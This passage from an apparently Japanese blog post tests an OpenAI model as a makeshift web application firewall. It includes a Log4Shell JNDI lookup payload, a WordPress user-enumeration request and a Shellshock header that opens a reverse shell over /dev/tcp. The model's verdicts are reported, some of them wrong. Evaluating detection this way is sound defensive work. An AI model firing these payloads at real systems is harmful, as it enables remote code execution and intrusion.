<span style="color: #ff0000">No</span>, this is not a cyber attack. This is an HTTP request for a web page.
</pre>
</div>

#### POSTパラメータ & ヘッダ無し

- POST：`${jndi:ldap://127.0.0.1:1389/a}`
- 2.68 秒
- **検出なし**

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
Is the following HTTP request a cyber attack?
-----
POST /post HTTP/1.1

msg=<span style="color: #ff0000">%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2Fa%7D</span>&_token=Qu5lkUoatVRwANAHzWEUKMdRrLBcCcS7Np3Nxpsu
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
<span style="color: #ff0000">No</span>, this is not a cyber attack. It appears to be a normal HTTP request.
</pre>
</div>

　<span style="color: #ff0000">**特定プロダクトに対する攻撃の検出には困難している模様。**</span>

#### POSTパラメータ & ヘッダ無し

　さらにノイズをなくすためにCSRFトークンも削除してみる。

- POST：`${jndi:ldap://127.0.0.1:1389/a}`
- POSTパラメータからCSRFトークンを削除
- ？秒
- **<span style="color: #ff0000">検出あり</span>**

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
Is the following HTTP request a cyber attack?
-----
POST /post HTTP/1.1

p=<span style="color: #ff0000">%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2Fa%7D</span>
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
<span style="color: #ff0000">Yes</span>, this is a cyber attack. The request is attempting to exploit a <span style="color: #ff0000">JNDI injection</span> vulnerability.
</pre>
</div>

　やっと検出されました。

### WordPress のユーザ列挙

- パス：`/wp-json/wp/v2/users`
- 6.49 秒
- **検出なし**

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
[2023-02-21 13:03:48] local.INFO: Is the following HTTP request a cyber attack?
-----
GET <span style="color: #ff0000">/wp-json/wp/v2/users</span> HTTP/1.1
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
<span style="color: #ff0000">No</span>, this is not a cyber attack. It is a legitimate HTTP request for a web page.
</pre>
</div>

　これは標準の機能として提供されているのが理由なのか、検出されそうにありませんでした。

### ShellShock

　最後に ShellShock。

- User-Agentヘッダ：`() { :;};/bin/bash -i >& /dev/tcp/127.0.0.1/3333 0>&1`
- 3.23 秒
- **<span style="color: #ff0000">検出あり</span>**

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>Is the following HTTP request a cyber attack?
-----
GET /cgi-bin/test.cgi HTTP/1.1
ACCEPT: */*
USER-AGENT: <span style="color: #ff0000">() { :;};/bin/bash -i >& /dev/tcp/127.0.0.1/3333 0>&1</span>
HOST: 127.0.0.1</pre>
</div>

<div class="md-code" style="width:100%;">
<pre class="code" data-lang="" data-unlink>Yes, this HTTP request is a cyber attack. <span style="color: #ff0000">It is an example of a Shellshock attack</span>, 
which is a type of attack that takes advantage of a vulnerability in the Bash shell.</pre>
</div>

　余裕の模様です。

## まとめ

- 攻撃シグネチャを検出させたい方向に持って行ったりしましたが、「WordPress のユーザ列挙」以外は検出できる結果。
  - 「XSSのCookieを盗もうとしている」や「OSコマンドインジェクションのアクセスログを削除しようとしている」といった影響まで返答する点は期待以上の挙動。
- レスポンスは約3 ~ 10秒（WAF無しで0.42秒）。
  - 検証前から分かっていたことではありますが、実運用でWAFとして使うのはムリそう。
  - OpenAI の負荷状況によってレスポンス時間が大きく変動する。場合によっては 504 Gateway Timeout になってた。
- リクエスト全体で攻撃リクエストの判定を行うと精度が大きく下がる。
  - 「リクエストライン」「ヘッダ」「メッセージボディ」で分けて検査すると精度が上がりそう。
- 1リクエスト約1円の課金は高い。
  - トライアルは$18までなのでご注意を。


[blog:g:12921228815726579926:banner]
